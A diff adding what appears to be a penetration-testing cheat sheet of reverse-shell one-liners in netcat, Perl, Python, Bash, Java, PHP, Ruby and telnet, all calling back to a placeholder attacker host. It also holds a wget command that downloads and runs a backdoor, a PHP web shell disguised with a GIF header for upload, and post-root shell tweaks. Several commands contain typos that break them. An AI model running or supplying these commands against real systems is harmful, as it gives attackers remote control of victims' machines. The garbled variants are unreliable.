@@ -1,0 +1,109 @@
+#Reverse Shells
+
+
+#Netcat Linux reverse shell
+nc 10.0.0.1 1234 -e /bin/sh
+
+#Netcat Windows reverse shell
+nc 10.0.0.1 1234 -e cmd.exe
+
+#Netcat Listener
+nc -nlvp 4444
+
+
+#Perl
+perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM,
+getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){
+open(STDIN,">$S");open(STDOUT,">&S");open(STDERR,">&S"); exec("/bin/sh-i");};'
+
+#Perl without /BIN/SH
+perl -MIO -e '$p=fork;exit,if($p);$c=new
+IO::Socket::INET(PeerAddr,"attackerip:4444"):STDIN->fdopen($c,r):$~-
+>fdopen($c,w);system$_while<>;'
+
+#Perl for Windows
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-
+>fdopen($c,r);$~->fdopen($c,w);system$_while<>;'
+
+#Python
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,
+socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i]);'
+
+#Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+#Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 |
+while read line; do \$line 2>&5; done"] as String[])
+p.waitFor()
+
+#PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
+sprintf("/bin/sh -i <&%d >&%d 2>&d",f,f,f)'
+
+#Ruby without /BIN/SH
+by -rsocket -e 'exit if
+fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")
+{|io|c.print io.read}end'
+
+#Ruby for Windows
+ruby -rsocket -e
+'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd."r){|
+io|c.print io.read}end'
+
+#Telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+--OR--
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+
+#Xterm
+xterm -display 10.0.0.1:1
+o Start Listener: Xnest :1
+o Add permission to connect:xhost +vistimIP
+
+#Misc
+wget http://<server>/cackdoor.sh -O- | sh Downloads and runs backdoor.sh
+
+
+#More Very Usefull shell commands
+PHP 
+#This PHP shell cmd can be uploaded to a Web App to create a reverse shell using Burp Suite
+GIF89;
+<?php echo shell_exec($_GET["cmd"]);?>
+
+#Python- Spawn a TTY shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+#Stablizer commands- This creates a more "interactive" reverse shell session
+#Python -spawn a TTY Shell
+This creates a more "interactive" reverse shell session
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+Linux - system stability command
+#When dirty_writeback_centisecs is set to 0, all periodic writeback is disabled.
+#Therefore,upon getting a reverse shell at root-level,
+#the follow Linux command can add system stability.
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+
+#More TTY shell spawning commands
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+
+
+
+
+
+
+
